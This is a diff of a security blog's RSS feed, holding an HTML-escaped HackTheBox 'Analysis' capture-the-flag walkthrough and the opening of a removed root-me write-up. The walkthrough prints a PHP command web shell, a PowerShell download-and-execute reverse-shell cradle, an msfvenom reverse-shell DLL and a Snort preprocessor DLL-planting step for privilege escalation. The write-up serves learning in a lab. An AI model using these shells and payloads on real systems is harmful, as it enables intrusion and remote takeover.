+Testing &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%29&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Testing _ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv_&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Testing + &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%2B&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Testing &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%3D&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Testing - &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Round 2 password is: &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;redacted&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Attempting login...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Login successful!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Password is: &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;redacted&amp;gt;&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With the password at our disposal, we can log into the admin interface:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis08.png&quot; alt=&quot;admin interface&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;step-2---getting-foothold&quot;&gt;&lt;a href=&quot;#step3-foothold&quot;&gt;&lt;/a&gt;Step 2 - Getting foothold&lt;/h2&gt;
+
+&lt;p&gt;Poking around a little bit, we find an upload funcionality at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dashboard/form.php&lt;/code&gt;. Since the website seems to be rendering PHP, let’s upload a PHP script containing the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;h1&amp;gt;hi mom&amp;lt;/h1&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis09.png&quot; alt=&quot;first upload response&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see from the response, the file was uploaded. Now, we need to find the endpoint where the uploads are stored. Let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; to find it:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://internal.analysis.htb/dashboard/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; usr/share/wordlists/dirbuster/directory-list-1.0.txt &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;
+img
+uploads
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, it is located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dashboard/uploads&lt;/code&gt;. Accessing the page under the name of the file we uploaded:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis10.png&quot; alt=&quot;uploaded php page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since this is a Windows machine, let’s first upload a webshell and get a reverse shell from it. For that, we will use the following PHP script:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;PHP_SELF&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TEXT&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;autofocus&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;size=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;80&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SUBMIT&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Execute&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;cmd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After uploading it under the name of concha.php and accessing it, we find the following page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis11.png&quot; alt=&quot;web-shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can test our web-shell by sending the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis12.png&quot; alt=&quot;whoami in webshell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok, now we need a one-liner reverse shell to feed this form field. First, we will download &lt;a href=&quot;https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1&quot;&gt;this&lt;/a&gt; PowerShell reverse shell code on our local machine and save it under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell-payload.ps1&lt;/code&gt;. Change everything necessary there, such as your IP address and port. Now we open a Python server where we saved the payload with&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 2323
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, we use this powershell command as promp to our web-shell: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&apos;http://&amp;lt;your-ip&amp;gt;:2323/shell-payload.ps1&apos;)&quot;&lt;/code&gt;. Before running it, we open a new netcat listener on the port we passed in the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell-payload.ps1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis13.png&quot; alt=&quot;rev-shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we get the reverse shell as the web service account!&lt;/p&gt;
+
+&lt;h2 id=&quot;step-3---system-enumeration&quot;&gt;&lt;a href=&quot;#step3-crafting-the-attack&quot;&gt;&lt;/a&gt;Step 3 - System enumeration&lt;/h2&gt;
+
+&lt;p&gt;Let’s upload PrivescCheck.ps1 (you can find it &lt;a href=&quot;https://github.com/itm4n/PrivescCheck&quot;&gt;here&lt;/a&gt;) using the upload functionality within the website. Then, we can simply run it inside the shell by typing in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;. .\PrivescCheck.ps1; Invoke-PrivescCheck&lt;/code&gt;. We will then find a pair of credentials that can be used to log in as a user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jdoe&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis14.png&quot; alt=&quot;creds&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s use Evil-WinRM to connect with this user and spawn a more stable shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.129.223.1 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jdoe &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &amp;lt;redacted&amp;gt;
+
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;analysis&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../Desktop
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
+
+
+    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
+
+
+Mode                LastWriteTime         Length Name
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-ar---&lt;/span&gt;        1/23/2024  10:33 PM             34 user.txt
+
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;doe&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
+71d78169aa06bb5f7d5b1e6fd7babd81
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now that we are inside, let’s take a look again at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PrivescCheck.ps1&lt;/code&gt;. After some greps here and there, I’ve found these lines:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis15.png&quot; alt=&quot;snort svc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After some research, I’ve found &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2016-1417/&quot;&gt;this&lt;/a&gt; CVE about dll hijack. In this exploit an attacker would place arbitrary code under tcapi.dll and run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snort.exe&lt;/code&gt; to open any pcap file. Unfortunately, that did not work. I had to dig a little deeper…&lt;/p&gt;
+
+&lt;p&gt;During my research, I found &lt;a href=&quot;https://www.spencerdrayton.co.uk/blog/snort-custom-dynamic-preprocessor/&quot;&gt;this&lt;/a&gt; reference saying snort uses dynamic preprocessors for various network traffic analysis tasks. These preprocessors are dynamically loaded at runtime from the snort_dynamicpreprocessor directory.&lt;/p&gt;
+
+&lt;p&gt;This mechanism of dynamically loading preprocessors provides significant flexibility. But, there’s a catch. Since Snort will load these preprocessors without much questioning, someone could sneak in a bad preprocessor – kind of like a rogue app – into the folder where Snort looks for them. This folder is located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Snort\lib\snort_dynamicpreprocessor&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;-step-4---privilege-escalation&quot;&gt;&lt;a href=&quot;#solving&quot;&gt;&lt;/a&gt; Step 4 - Privilege escalation&lt;/h2&gt;
+&lt;p&gt;With that in mind, let’s create a reverse shell with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; to create a malicious dll and upload it to the dynamic preprocessor:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/x64/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.153 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dll &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; sf_shell.dll
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, we open our netcat on port 4444 and download this dll from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jdoe&lt;/code&gt; user shell we have access to with the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Invoke-WebRequest &lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.14.153:1234/sf_shell.dll&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-OutFile&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;doe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f_shell.dll&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Don’t forget to start a Python server on port 1234 in the directory containing the dll shell. After that, we run the following command on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jdoe&lt;/code&gt; shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upload sf_shell.dll c:&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;nort&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;ib&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;nort_dynamicpreprocessor
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And then we wait…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis17.png&quot; alt=&quot;root shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we got root!&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;In this CTF, we learned a lot more about LDAP injection techniques and Snort. We were able to retrieve sensitive information using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kerbrute&lt;/code&gt; by first gathering possible and valid emails. After that, with LDAP injection, we were able to guess the user’s password and log into the administrator panel. From there, we escalated our privileges using a web shell, granting us access as the web service. For lateral movement, we used PrivescCheck.ps1 and found leaked credentials.&lt;/p&gt;
+
+&lt;p&gt;After successfully logging in the leaked user credentials’ account, we escalated privileges by uploading a maliciously crafted dll into the snort dynamic preprocessor’s directory, which then spawned us the root shell.&lt;/p&gt;
+
+&lt;p&gt;It was nice ride, for sure!&lt;/p&gt;
+
+&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 24 Jan 2024 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000//analysis-htb</link>
+        <link href="http://localhost:4000/analysis-htb"/>
+        <guid isPermaLink="true">http://localhost:4000/analysis-htb</guid>
+      </item>
+    
+      <item>
         <title>FriendZone - HackTheBox</title>
         <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
 
@@ -2906,161 +3552,6 @@ HTB&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;redacted&lt;span class=&quot;o&
         <link>http://localhost:4000//0xdiablos-htb</link>
         <link href="http://localhost:4000/0xdiablos-htb"/>
         <guid isPermaLink="true">http://localhost:4000/0xdiablos-htb</guid>
-      </item>
-    
-      <item>
-        <title>R Code Execution - root-me.org</title>
-        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
-
-&lt;p&gt;Long time no see! It’s been a while since I last posted. But now that we are back, let’s solve another &lt;a href=&quot;https://www.root-me.org&quot;&gt;Root-me&lt;/a&gt; CTF! This time, we are going to attack the R: Command Execution, under the app. I never programmed in R before, so this might be a tricky one for me. We might need to do a good research on this.&lt;/p&gt;
-
-&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
-&lt;p&gt;Let’s check the statement:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Statement&lt;/p&gt;
-
-  &lt;p&gt;Your Statistical Analysis Reviews in R are approaching. Your teacher has made an R interpreter available on the ENT of the university so that you can practice. You don’t have time to revise, you decide to steal the exam papers.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Alright! We are playing the cheater’s role this time. To start this challenge, we need to click on a button “Start the challenge”. No need to ssh this time. After clicking the button, we arrive at a R console:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec.png&quot; alt=&quot;R Console&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
-
-&lt;p&gt;As always, let’s keep the following approach mindset:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Understanding basic concepts&lt;/li&gt;
-  &lt;li&gt;Understanding the problem&lt;/li&gt;
-  &lt;li&gt;Crafting an attack&lt;/li&gt;
-  &lt;li&gt;Solving&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;
-
-&lt;p&gt;Ok. First of all, we need to learn how to interact with this console. I’ll try be brief and show all of my attempts. Suppose we are ignorant in R (as I am). My first command in this console was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;, which gave me the following:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;../figs/R-exec2.png&quot; alt=&quot;Output of ls in console&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;To me, this seemed as an error message. But after a bit of research, I found that it wasn’t. You see, in R, when we define a function, say one like this:&lt;/p&gt;
-
-&lt;div class=&quot;language-R highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;my_func&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Hi mom&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
